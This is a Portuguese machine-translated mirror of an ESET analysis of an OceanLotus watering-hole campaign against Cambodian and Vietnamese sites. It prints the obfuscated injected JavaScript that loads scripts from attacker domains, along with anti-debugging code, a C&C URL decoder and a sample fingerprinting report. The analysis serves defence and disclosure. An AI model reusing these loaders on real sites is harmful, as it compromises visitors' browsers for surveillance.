<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚úàÔ∏è ü¶ì üë©üèæ‚Äçü§ù‚Äçüë®üèª OceanLotus: ataque a po√ßos no sudeste da √Åsia üôÖ ü§¨ üëµüèª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Os especialistas da ESET analisaram a nova campanha de watering hole, que tem como alvo v√°rios locais no sudeste da √Åsia. Alegadamente, os atacantes e...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>OceanLotus: ataque a po√ßos no sudeste da √Åsia</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/436136/">  Os especialistas da ESET analisaram a nova campanha de watering hole, que tem como alvo v√°rios locais no sudeste da √Åsia.  Alegadamente, os atacantes est√£o em opera√ß√£o desde o in√≠cio de setembro de 2018.  A campanha √© diferente em escala - conseguimos descobrir 21 recursos comprometidos, incluindo os sites do Minist√©rio da Defesa do Camboja, Minist√©rio das Rela√ß√µes Exteriores e Coopera√ß√£o Internacional do Camboja, al√©m de v√°rios jornais e blogs vietnamitas. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/i5/w7/do/i5w7dovvrgp-jyuwqn0cgd72oy0.jpeg"></div> <br>  Com base na an√°lise, descobrimos que a campanha est√° sendo realizada pelo grupo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">OceanLotus</a> , tamb√©m conhecido como <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ART32</a> e ART-S-00.  O grupo opera desde pelo menos <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">2012</a> e √© especializado em espionagem cibern√©tica, com um interesse particular em ag√™ncias e dissidentes do governo. <br><br><a name="habracut"></a>  Parece que a campanha √© uma evolu√ß√£o do esquema OceanLotus, que os pesquisadores da Volexity <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">documentaram</a> em 2017 sob o nome Framework B. Desde o ano passado, o grupo cibern√©tico aprendeu a dificultar a an√°lise de estruturas maliciosas.  Entre outras melhorias, notamos o uso da criptografia de chave p√∫blica para a troca da chave de sess√£o do AES.  O m√©todo √© usado para criptografar a troca de dados que n√£o permite que produtos de seguran√ßa interceptem a carga √∫til final.  Al√©m disso, os invasores mudaram do HTTP para o WebSocket para ocultar a troca de dados maliciosos. <br><br>  Cada um dos sites comprometidos descobertos pelos especialistas da ESET redirecionou os visitantes para um dom√≠nio separado controlado pelo OceanLotus. <br><br>  A imagem abaixo mostra as regi√µes de destino da campanha. <br><br><img src="https://habrastorage.org/webt/ek/wr/ov/ekwrovbvngwngd-noo6vevjqfqo.png"><br>  <i>Figura 1. Geografia dos sites comprometidos</i> <br><br>  Os dom√≠nios mais comprometidos s√£o os meios de comunica√ß√£o ou relacionados ao governo do Camboja.  A seguir, √© apresentada uma lista de v√≠timas.  N√≥s os alertamos sobre o comprometimento em outubro, mas no final de 2018, scripts maliciosos permaneciam em alguns sites: <br><br>  - baotgm [.] Net - m√≠dia vietnamita (sede em Arlington, Texas) <br>  - cnrp7 [.] Org - site do Partido Nacional da Salva√ß√£o no Camboja <br>  - conggiaovietnam [.] Net - conte√∫do religioso em vietnamita <br>  - daichungvienvinhthanh [.] Com - conte√∫do religioso em vietnamita <br>  - danchimviet [.] Info - M√≠dia vietnamita <br>  - danviet [.] Vn - M√≠dia vietnamita <br>  - danviethouston [.] Com - M√≠dia vietnamita <br>  - fvpoc [.] Org - organiza√ß√£o p√∫blica vietnamita <br>  - gardencityclub [.] Com - local do clube de golfe em Phnom Penh, Camboja <br>  - lienketqnhn [.] Org - M√≠dia vietnamita <br>  - mfaic.gov [.] Kh - Minist√©rio dos Neg√≥cios Estrangeiros e Coopera√ß√£o Internacional do Camboja <br>  - mod.gov [.] Kh - Minist√©rio da Defesa do Camboja <br>  - mtgvinh [.] Net - conte√∫do religioso em vietnamita <br>  - nguoitieudung.com [.] Vn - M√≠dia vietnamita <br>  - phnompenhpost [.] Com - m√≠dia cambojana em ingl√™s <br>  - raovatcalitoday [.] Com - site em vietnamita <br>  - thongtinchongphandong [.] Com - meios de comunica√ß√£o em vietnamita <br>  - tinkhongle [.] Com - M√≠dia vietnamita <br>  - toithichdoc.blogspot [.] Com - blog vietnamita <br>  - trieudaiviet [.] Com - site em vietnamita <br>  - triviet [.] Not√≠cias - M√≠dia vietnamita <br><br>  Em ataques a bebedouros, os atacantes geralmente comprometem os sites que s√£o frequentemente visitados por poss√≠veis v√≠timas.  No entanto, nesta campanha, o grupo OceanLotus comprometeu v√°rios sites populares.  Abaixo est√° uma lista de sites comprometidos e sua <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">classifica√ß√£o Alexa</a> : global e no pa√≠s em que o site √© mais popular.  Por exemplo, o site do jornal Dan Viet (danviet [.] Vn) no final de 2018 estava na 116¬™ linha em termos de participa√ß√£o no Vietn√£. <br><br>  - danviet [.] Vn - 12 887/116 <br>  - phnompenhpost [.] Com - 85 910/18 880 <br>  - nguoitieudung.com [.] Vn - 261 801/2 397 <br>  - danchimviet [.] Info - 287 852/144 884 <br>  - baotgm [.] L√≠quido - 675 669/119 737 <br>  - toithichdoc.blogspot [.] Com - 700 470/11532 <br>  - mfaic.gov [.] Kh - 978 165/2 149 <br>  - conggiaovietnam [.] Net - 1.040 548/15 368 <br>  - thongtinchongphandong [.] Com - 1 134 691/21 575 <br>  - tinkhongle [.] Com - 1 301 722/15 224 <br>  - daichungvienvinhthanh [.] Com - 1.778.418 / 23.428 <br>  - mod.gov [.] Kh - 4.247.649 / 3.719 <br><br><h3>  An√°lise </h3><br>  Para todos os sites comprometidos, m√©todos semelhantes foram usados.  Os invasores adicionaram um pequeno peda√ßo de c√≥digo JavaScript √† p√°gina principal ou a um arquivo JavaScript publicado no mesmo servidor.  Um fragmento de c√≥digo um pouco ofuscado (veja abaixo) carrega outro script de um servidor controlado pelo invasor.  Abaixo est√° um trecho de JavaScript adicionado a <code>https://www.mfaic.gov[.]kh/wp-content/themes/ministry-of-foreign-affair/slick/slick.min.js</code> , que baixa o arquivo de <code>https://weblink.selfip[.]info/images/cdn.js?from=maxcdn</code> . <br><br><pre> <code class="javascript hljs">(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pt = <span class="hljs-string"><span class="hljs-string">"http"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> l = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); l.src = pt + <span class="hljs-string"><span class="hljs-string">"s://"</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">0</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">2</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">3</span></span>] + <span class="hljs-string"><span class="hljs-string">'ip.'</span></span> + <span class="hljs-string"><span class="hljs-string">'info/images/cdn.js?from=maxcdn'</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'body'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].appendChild(l) })(<span class="hljs-string"><span class="hljs-string">'web'</span></span>, <span class="hljs-string"><span class="hljs-string">'a'</span></span>, <span class="hljs-string"><span class="hljs-string">'link'</span></span>, <span class="hljs-string"><span class="hljs-string">'.self'</span></span>);</code> </pre> <br>  Para evitar a detec√ß√£o, os atacantes tomaram as seguintes medidas: <br><br>  - Eles ofuscam scripts para impedir que URLs finais est√°ticos sejam alocados <br>  - O URL se parece com a biblioteca JavaScript real usada pelo site <br>  - Para cada site comprometido, um dom√≠nio separado e um URI s√£o usados. <br>  - Todos os sites comprometidos possuem scripts diferentes.  A seguir, um script sendo implementado em um dos sites comprometidos: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> script = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">"script"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-string"><span class="hljs-string">'crash-course'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = <span class="hljs-string"><span class="hljs-string">"fzgbc knowsztall znfo"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _ = <span class="hljs-string"><span class="hljs-string">'/'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-string"><span class="hljs-string">"VisitorIdentification.js?sa="</span></span> + i; script.async = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; script.src = <span class="hljs-string"><span class="hljs-string">"htt"</span></span> + <span class="hljs-string"><span class="hljs-string">"ps:"</span></span> + _ + _ + s.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>).map(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">x</span></span></span><span class="hljs-function"> =&gt;</span></span> x.replace(<span class="hljs-string"><span class="hljs-string">"z"</span></span>, <span class="hljs-string"><span class="hljs-string">"i"</span></span>)).join(<span class="hljs-string"><span class="hljs-string">"."</span></span>) + _ + e; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> doc = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'script'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]; doc.parentNode.insertBefore(script, doc);</code> </pre> <br><h3>  Primeira etapa </h3><br>  Dependendo da localiza√ß√£o do endere√ßo IP do visitante, o servidor do primeiro est√°gio (por exemplo, <code>weblink.selfip[.]info</code> para <code>mfaic.gov[.]kh</code> ) transmite um script falso (biblioteca JavaScript leg√≠tima aleat√≥ria) ou um script do primeiro est√°gio (por exemplo, SHA- 1: 2194271C7991D60AE82436129D7F25C0A689050A).  Nem todos os servidores executam verifica√ß√µes de localiza√ß√£o, mas se houver, apenas os visitantes do Vietn√£ e do Camboja recebem um script malicioso. <br><br>  O script do primeiro est√°gio possui v√°rias verifica√ß√µes para impedir a detec√ß√£o, como mostrado abaixo. <br><br><pre> <code class="javascript hljs">[‚Ä¶] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">t</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; !<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!(t <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> n)) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">TypeError</span></span>(<span class="hljs-string"><span class="hljs-string">'Cannot call a class as a function'</span></span>); }(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, t), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.t = { <span class="hljs-attr"><span class="hljs-attr">o</span></span>: <span class="hljs-literal"><span class="hljs-literal">null</span></span>, <span class="hljs-attr"><span class="hljs-attr">s</span></span>: !<span class="hljs-number"><span class="hljs-number">0</span></span> }, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.scr = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.r(), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.i = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">'scroll'</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ri || r.scr &amp;&amp; !rts &amp;&amp; (r.scr = !<span class="hljs-number"><span class="hljs-number">1</span></span>, rc(n)), ri = !<span class="hljs-number"><span class="hljs-number">1</span></span>; }); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t.prototype.r = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; setInterval(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerWidth - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerWidth &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, r = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerHeight - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerHeight &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, e = n ? <span class="hljs-string"><span class="hljs-string">'vertical'</span></span> : <span class="hljs-string"><span class="hljs-string">'horizontal'</span></span>; r &amp;&amp; n || !(<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome.isInitialized || n || r) ? (tts = !<span class="hljs-number"><span class="hljs-number">1</span></span>, tto = <span class="hljs-literal"><span class="hljs-literal">null</span></span>) : (tts = !<span class="hljs-number"><span class="hljs-number">0</span></span>, tto = e); }, <span class="hljs-number"><span class="hljs-number">500</span></span>); } [‚Ä¶]</code> </pre> <br>  O script aguarda at√© a v√≠tima rolar para a p√°gina.  Ele tamb√©m verifica a resolu√ß√£o da janela e se o Firebug, um plug-in baseado em navegador para analisar p√°ginas da Web, est√° ativado.  Se pelo menos uma das verifica√ß√µes falhar, a execu√ß√£o ser√° encerrada. <br><br>  Ele ent√£o descriptografa o dom√≠nio do servidor de comando C&amp;C usando um algoritmo personalizado.  Por exemplo, 3B37371M1B1B382R332V1A382W36392W2T362T1A322T38 significa <code>wss://tcog.thruhere[.]net</code> .  Para cada dom√≠nio do primeiro est√°gio, os atacantes registraram adicionalmente um dom√≠nio do segundo est√°gio e todos eles est√£o localizados em servidores diferentes.  O c√≥digo abaixo √© equivalente √† fun√ß√£o de descriptografia escrita em Python. <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(encrypted_url)</span></span></span><span class="hljs-function">:</span></span> s = <span class="hljs-string"><span class="hljs-string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">""</span></span>.join(chr(s.index(encrypted_url[e]) * <span class="hljs-number"><span class="hljs-number">36</span></span> + s.index(encrypted_url[e+<span class="hljs-number"><span class="hljs-number">1</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>,len(encrypted_url),<span class="hljs-number"><span class="hljs-number">2</span></span>))</code> </pre> <br>  Ap√≥s decifrar o endere√ßo C&amp;C, o script envia uma sequ√™ncia exclusiva de 15 d√≠gitos e recebe e executa o script do segundo est√°gio.  A troca de dados √© realizada via WebSocket ou SSL.  O protocolo fornece comunica√ß√£o bidirecional simult√¢nea entre o cliente e o servidor.  Isso significa que, depois que um cliente estabelece uma conex√£o, o servidor pode enviar dados para o cliente, mesmo sem uma solicita√ß√£o.  No entanto, em um caso espec√≠fico, o protocolo √© usado principalmente para evitar a detec√ß√£o. <br><br><h3>  Segunda etapa </h3><br>  O roteiro do segundo est√°gio √© para reconhecimento.  Os desenvolvedores do OceanLotus usaram a biblioteca fingerprintjs2 da Valve, dispon√≠vel no <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">GitHub</a> , com pequenas altera√ß√µes - adicionando compartilhamento de rede e criando um relat√≥rio especial. <br><br>  A figura abaixo mostra as v√°rias a√ß√µes executadas pelo script.  A comunica√ß√£o √© feita por meio de uma sess√£o do WebSocket iniciada na primeira etapa. <br><br><img src="https://habrastorage.org/webt/p7/s1/ip/p7s1ipl0ax28vo16mj2je2a59kc.png"><br>  <i>Figura 2. Esquema do segundo est√°gio da carga √∫til</i> <br><br>  A comunica√ß√£o √© criptografada usando a chave de sess√£o AES gerada pelo servidor.  Ele √© criptografado com uma chave p√∫blica RSA de 1024 bits e enviado ao cliente, portanto, n√£o √© poss√≠vel descriptografar a troca de dados entre o cliente e o servidor. <br><br>  Em compara√ß√£o com as vers√µes anteriores da estrutura do po√ßo de √°gua OceanLotus, √© mais dif√≠cil se proteger disso, porque a transmiss√£o de dados pela rede n√£o pode ser detectada e descriptografada.  Isso impede a descoberta de dados pela rede.  A chave p√∫blica transmitida pelo servidor n√£o muda e est√° listada na se√ß√£o IoC. <br><br>  O script de reconhecimento cria um relat√≥rio semelhante ao abaixo e o envia ao servidor C&amp;C do segundo est√°gio. <br><br><pre> <code class="javascript hljs">{ <span class="hljs-string"><span class="hljs-string">"history"</span></span>: { <span class="hljs-string"><span class="hljs-string">"client_title"</span></span>: <span class="hljs-string"><span class="hljs-string">"Ministry%20of%20Foreign%20Affairs%20and%20International%20Cooperation%20-"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_url"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_cookie"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_hash"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_referrer"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/foreign-ngos"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_platform_ua"</span></span>: <span class="hljs-string"><span class="hljs-string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_time"</span></span>: <span class="hljs-string"><span class="hljs-string">"2018-10-21T12:43:25.254Z"</span></span>, <span class="hljs-string"><span class="hljs-string">"timezone"</span></span>: <span class="hljs-string"><span class="hljs-string">"Asia/Bangkok"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_network_ip_list"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"192.168.xx"</span></span>, <span class="hljs-string"><span class="hljs-string">"xxxx"</span></span> ], <span class="hljs-string"><span class="hljs-string">"client_api"</span></span>: <span class="hljs-string"><span class="hljs-string">"wss://tcog.thruhere.net/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_zuuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"defaultcommunications39e10c84a0546508c58d48ae56ab7c7eca768183e640a1ebbb0cceaef0bd07cedefaultcommunications9360af458bb80c43fd1f73190b80dbfb0b276c48a8a6d453444dae086bc77be7"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_uuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"a612cdb028e1571dcab18e4aa316da26"</span></span> }, <span class="hljs-string"><span class="hljs-string">"navigator"</span></span>: { <span class="hljs-string"><span class="hljs-string">"plugins"</span></span>: { <span class="hljs-string"><span class="hljs-string">"activex"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"cors"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"flash"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"java"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"foxit"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"phonegap"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"quicktime"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"realplayer"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"silverlight"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"touch"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vbscript"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vlc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"webrtc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"wmp"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span> }, <span class="hljs-string"><span class="hljs-string">"_screen"</span></span>: { <span class="hljs-string"><span class="hljs-string">"width"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"height"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"availWidth"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"availHeight"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"resolution"</span></span>: <span class="hljs-string"><span class="hljs-string">"1920x1080"</span></span> }, <span class="hljs-string"><span class="hljs-string">"_plugins"</span></span>: [ [...]</code> </pre> <br>  Este relat√≥rio √© quase id√™ntico ao outro gerado pelo <a href="">OceanLotus Framework B</a> , documentado pela Volexity em 2017.  Suas se√ß√µes s√£o semelhantes e cont√™m erros de digita√ß√£o id√™nticos.  Devido a essa semelhan√ßa e localiza√ß√£o de metas, podemos dizer com um alto grau de certeza que a OceanLotus est√° conduzindo a campanha. <br><br>  O relat√≥rio gerado cont√©m informa√ß√µes detalhadas sobre o navegador da v√≠tima e o site visitado: agente do usu√°rio, cabe√ßalho da solicita√ß√£o do Referenciador HTTP, endere√ßo IP local e externo, plug-ins e configura√ß√µes do idioma do navegador. <br><br>  Al√©m disso, cada m√°quina possui dois identificadores exclusivos: <i>client_zuuid</i> e <i>client_uuid</i> .  Eles podem ser usados ‚Äã‚Äãpara identificar usu√°rios e rastrear suas visitas.  Na verdade, esses identificadores estavam presentes na vers√£o 2017 da estrutura e o <i>client_uuid foi</i> calculado de maneira semelhante. <br><br>  O valor de <i>client_zuuid</i> √© a concatena√ß√£o dos v√°rios valores de deviceId contidos em navigator.mediaDevices.enumerateDevices.  Dispositivos s√£o dispositivos externos aos quais o navegador tem acesso, como c√¢meras e microfones.  Portanto, o valor para um usu√°rio deve corresponder durante diferentes visitas do mesmo computador. <br><br>  O valor <i>client_uuid</i> √© o hash MD5 das impress√µes digitais alocadas por fingerprintjs2.  Os dados coletados incluem o agente do usu√°rio do navegador, idioma, fuso hor√°rio, plug-ins do navegador e fontes acess√≠veis pelo navegador.  E novamente - o valor deve ser id√™ntico para todas as visitas, apenas se, por exemplo, o usu√°rio n√£o atualizar o navegador ou n√£o fizer login a partir de outro dispositivo. <br><br>  Por fim, o servidor pode enviar c√≥digo JavaScript adicional ao computador da v√≠tima, talvez este seja o componente entregue.  Infelizmente, devido ao uso da chave de sess√£o do AES para descriptografar a troca de dados, n√£o conseguimos determinar qual componente √© entregue pelos invasores nas amostras in-the-wild.  Al√©m disso, a carga √∫til √© entregue apenas a certas v√≠timas.  Assim, usando uma m√°quina de teste, n√£o fomos capazes de obt√™-los.  No entanto, de acordo com relat√≥rios anteriores, as campanhas do OceanLotus s√£o direcionadas para phishing.  Por exemplo, o Volexity em um relat√≥rio <a href="">escreveu</a> que os usu√°rios viram uma janela pop-up solicitando que autorizassem o acesso atrav√©s do protocolo OAuth aberto √† conta do Google da v√≠tima para o OceanLotus Google App.  Usando essa t√©cnica, os atacantes podem acessar os contatos e e-mails da v√≠tima. <br><br><h3>  Infraestrutura de rede </h3><br>  Para um trabalho secreto m√°ximo, os operadores da OceanLotus registraram um dom√≠nio para o primeiro e o segundo est√°gio de cada um dos sites comprometidos.  Cada dom√≠nio est√° hospedado em um servidor separado com seu pr√≥prio endere√ßo IP.  Pelo menos 50 dom√≠nios e 50 servidores est√£o registrados para esta campanha. <br><br>  A maioria dos dom√≠nios de primeiro est√°gio √© registrada em servi√ßos com nomes de dom√≠nio gratuitos; os dom√≠nios de segundo est√°gio s√£o pagos principalmente.  Entre outras coisas, seus nomes s√£o disfar√ßados de leg√≠timos.  Abaixo est√° uma lista de servi√ßos que os invasores tentaram copiar - C&amp;C e um dom√≠nio leg√≠timo, respectivamente: <br><br>  - cdn-ampproject [.] Com / cdn.ampproject.com <br>  - bootstraplink [.] Com / getbootstrap.com <br>  - sskimresources [.] Com / s.skimresources.com <br>  - widgets-wp [.] Com / widgets.wp.com <br><br>  O n√∫mero de dom√≠nios usados ‚Äã‚Äãe sua semelhan√ßa com sites leg√≠timos podem complicar a detec√ß√£o por uma pessoa que est√° visualizando o tr√°fego de rede. <br><br><h3>  Conclus√£o </h3><br>  Apesar da aten√ß√£o dos pesquisadores de seguran√ßa, a OceanLotus continua atacando com sucesso alvos no sudeste da √Åsia.  Al√©m disso, o grupo aprimora as ferramentas, incluindo em seu arsenal uma estrutura para ataques de watering hole, um malware para Windows e macOS.  As atualiza√ß√µes recentes da estrutura discutidas neste relat√≥rio indicam que os invasores aprimoraram suas habilidades. <br><br>  Para limitar o n√∫mero de poss√≠veis v√≠timas, notificamos os propriet√°rios dos sites comprometidos e explicamos como remover o c√≥digo JavaScript malicioso.  No entanto, alguns deles n√£o demonstraram vontade de aceitar informa√ß√µes e assist√™ncia. <br><br>  Os pesquisadores da ESET continuar√£o monitorando o desenvolvimento do grupo OceanLotus.  Indicadores de comprometimento podem ser encontrados no <a 